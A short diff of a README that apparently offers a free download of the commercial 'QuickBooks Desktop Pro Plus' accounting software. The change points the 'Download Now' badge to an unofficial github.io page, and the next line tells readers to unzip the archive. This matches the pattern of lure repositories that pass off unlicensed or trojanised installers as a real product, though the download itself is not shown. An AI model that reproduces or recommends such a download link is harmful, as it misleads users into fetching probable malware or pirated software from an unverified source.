@@ -6,7 +6,7 @@ QuickBooks Desktop Pro Plus delivers a complete accounting, payroll, and busines
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://quickbooks-desktop-pro-plus.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
